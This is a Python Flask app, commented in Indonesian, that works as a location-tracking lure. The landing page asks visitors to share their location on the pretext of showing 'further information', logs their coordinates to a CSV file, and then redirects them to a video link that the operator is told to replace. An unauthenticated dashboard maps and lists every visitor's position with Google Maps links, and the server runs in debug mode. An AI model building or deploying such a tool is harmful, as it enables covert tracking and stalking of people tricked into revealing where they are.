from flask import Flask, request, render_template_string, redirect, jsonify
import os
import folium
import csv
from datetime import datetime

app = Flask(__name__)

LOG_FILE = "logs.csv"

# Fungsi untuk mencatat data lokasi yang diterima
def log_access(data):
    file_exists = os.path.exists(LOG_FILE)
    with open(LOG_FILE, mode="a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(["timestamp", "latitude", "longitude"])
        writer.writerow(data)

@app.route("/")
def index():
    return render_template_string('''
    <script>
        // Fungsi untuk meminta akses lokasi dengan notifikasi persetujuan
        function askLocationPermission() {
            if (navigator.geolocation) {
                const userConsent = confirm("Kami memerlukan izin lokasi Anda untuk melihat informasi selanjutnya. Apakah Anda setuju?");
                if (userConsent) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        fetch("/submit_location", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({ latitude: lat, longitude: lon })
                        }).then(response => response.json())
                          .then(data => {
                              if (data.success) {
                                  window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";  // Ganti dengan link video kamu
                              } else {
                                  alert("Gagal menyimpan lokasi.");
                              }
                          });
                    }, function() {
                        alert("Izin lokasi ditolak. Untuk melanjutkan, izinkan akses lokasi di pengaturan browser.");
                    });
                } else {
                    alert("Anda menolak izin lokasi. Tanpa izin lokasi, kami tidak bisa melanjutkan.");
                }
            } else {
                alert("Geolocation tidak didukung oleh browser kamu.");
            }
        }

        window.onload = askLocationPermission;
    </script>
    ''')

@app.route("/submit_location", methods=["POST"])
def submit_location():
    data = request.get_json()
    lat = data.get("latitude")
    lon = data.get("longitude")
    if lat is not None and lon is not None:
        log_access([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), lat, lon])
        return jsonify(success=True)
    return jsonify(success=False)

@app.route("/dashboard")
def dashboard():
    if not os.path.exists(LOG_FILE):
        return "Belum ada data yang tercatat."

    with open(LOG_FILE, "r", encoding="utf-8") as f:
        reader = csv.reader(f)
        data = list(reader)

    if len(data) > 1:
        last_lat, last_lon = float(data[-1][1]), float(data[-1][2])
    else:
        last_lat, last_lon = -6.1751, 106.8650  # fallback Jakarta

    # Buat peta utama
    map = folium.Map(location=[last_lat, last_lon], zoom_start=19)

    # Tambahkan tile layers
    folium.TileLayer("OpenStreetMap", name="Peta Standar").add_to(map)
    folium.TileLayer(
    "Stamen Toner",
    name="Toner (Kontras)",
    attr='Map tiles by Stamen Design, under CC BY 3.0. Data by OpenStreetMap, under ODbL.'
).add_to(map)

    folium.TileLayer(
        tiles='https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}',
        attr='Esri',
        name='Citra Satelit (Esri)',
        overlay=False,
        control=True
    ).add_to(map)

    # Tambahkan marker lokasi
    for row in data[1:]:
        lat, lon = float(row[1]), float(row[2])
        folium.Marker([lat, lon], popup=f"Pengunjung: {row[0]}").add_to(map)
        folium.CircleMarker(
            location=[lat, lon],
            radius=6,
            color='red',
            fill=True,
            fill_color='red'
        ).add_to(map)

    # Tambahkan kontrol layer
    folium.LayerControl().add_to(map)

    map_file = "static/dashboard_map.html"
    map.save(map_file)

    html_template = '''
    <h2>Dashboard Admin - Data Pengunjung</h2>
    <p>Total Pengunjung: {{ data|length - 1 }}</p>
    <a href="{{ url_for('index') }}">Kembali ke Halaman Utama</a>
    <br><br>
    <iframe src="{{ url_for('static', filename='dashboard_map.html') }}" width="100%" height="500"></iframe>
    <h3>Data Pengunjung</h3>
   <table border="1" cellpadding="5" cellspacing="0">
    <tr>
        <th>Waktu</th>
        <th>Latitude</th>
        <th>Longitude</th>
        <th>Aksi</th>
    </tr>
    {% for row in data[1:] %}
    <tr>
        <td>{{ row[0] }}</td>
        <td>{{ row[1] }}</td>
        <td>{{ row[2] }}</td>
        <td>
            <a href="https://www.google.com/maps?q={{ row[1] }},{{ row[2] }}" target="_blank">
                Lihat di Google Maps
            </a>
        </td>
    </tr>
    {% endfor %}
</table>

    '''

    return render_template_string(html_template, data=data)

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
